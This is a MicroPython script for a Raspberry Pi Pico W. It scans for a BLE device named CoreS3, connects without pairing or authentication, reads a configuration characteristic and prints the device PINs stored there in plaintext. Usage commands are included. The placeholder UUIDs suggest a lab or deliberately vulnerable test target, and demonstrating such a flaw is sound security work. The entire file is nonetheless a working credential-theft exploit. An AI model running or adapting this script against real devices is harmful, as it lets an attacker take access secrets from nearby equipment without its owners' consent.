"""BLE GATT credential leak for Raspberry Pi Pico W / Pico W 2 (MicroPython).

Connects to the CoreS3 BLE GATT service and reads the config
characteristic which contains device PINs in plaintext.
No authentication or pairing required.

Requirements:
  - Raspberry Pi Pico W or Pico W 2 (needs BLE)
  - MicroPython firmware for Pico W/W2

Usage:
  mpremote connect /dev/ttyACM1 cp pico_ble_read.py :main.py
  mpremote connect /dev/ttyACM1 run pico_ble_read.py
"""
import bluetooth
import time

SERVICE_UUID = bluetooth.UUID("12345678-1234-5678-1234-56789abc0001")
CONFIG_CHAR_UUID = bluetooth.UUID("12345678-1234-5678-1234-56789abc0002")

ble = bluetooth.BLE()
ble.active(True)

_conn = None
_char_h = None
_target = None
_read_data = None
_flags = {"scan_done": False, "connected": False, "disc_done": False, "read_done": False}

def decode_svc(adv):
    svcs = []
    i = 0
    while i < len(adv):
        ln = adv[i]
        if ln == 0: break
        at = adv[i + 1]
        if at in (0x06, 0x07):
            for j in range(i + 2, i + 1 + ln, 16):
                if j + 16 <= len(adv):
                    svcs.append(bluetooth.UUID(bytes(adv[j:j+16])))
        i += 1 + ln
    return svcs

def irq(ev, data):
    global _conn, _char_h, _target, _read_data
    if ev == 5:
        at, addr, _, rssi, adv = data
        if SERVICE_UUID in decode_svc(adv):
            _target = (at, bytes(addr))
            ble.gap_scan(None)
    elif ev == 6: _flags["scan_done"] = True
    elif ev == 7: _conn = data[0]; _flags["connected"] = True
    elif ev == 8: _flags["connected"] = False
    elif ev == 11:
        c, dh, vh, p, uuid = data
        if uuid == CONFIG_CHAR_UUID: _char_h = vh
    elif ev == 12: _flags["disc_done"] = True
    elif ev == 15:
        c, vh, d = data
        _read_data = bytes(d)
    elif ev == 16: _flags["read_done"] = True

ble.irq(irq)
print("Scanning for CoreS3 BLE device...")
ble.gap_scan(10000, 30000, 30000, True)
t = time.time() + 15
while not _flags["scan_done"] and _target is None and time.time() < t:
    time.sleep_ms(100)
if _target is None:
    print("ERROR: CoreS3 not found")
    raise SystemExit
print("Found:", ":".join("%02X" % b for b in _target[1]))

print("Connecting...")
ble.gap_connect(_target[0], _target[1])
t = time.time() + 10
while not _flags["connected"] and time.time() < t:
    time.sleep_ms(100)
if not _flags["connected"]:
    print("ERROR: Connection failed")
    raise SystemExit

print("Discovering characteristics...")
ble.gattc_discover_characteristics(_conn, 1, 65535)
t = time.time() + 10
while not _flags["disc_done"] and time.time() < t:
    time.sleep_ms(100)
if _char_h is None:
    print("ERROR: Config characteristic not found")
    ble.gap_disconnect(_conn)
    raise SystemExit

print("Reading config characteristic...")
ble.gattc_read(_conn, _char_h)
t = time.time() + 5
while not _flags["read_done"] and time.time() < t:
    time.sleep_ms(100)

if _read_data:
    config = _read_data.decode("utf-8", "ignore")
    print()
    print("=== CREDENTIALS LEAKED VIA BLE ===")
    print(config)
    for pair in config.split(";"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            print("  %s = %s" % (k.strip(), v.strip()))
    print("==================================")
else:
    print("ERROR: No data received")

ble.gap_disconnect(_conn)
time.sleep(1)
ble.active(False)
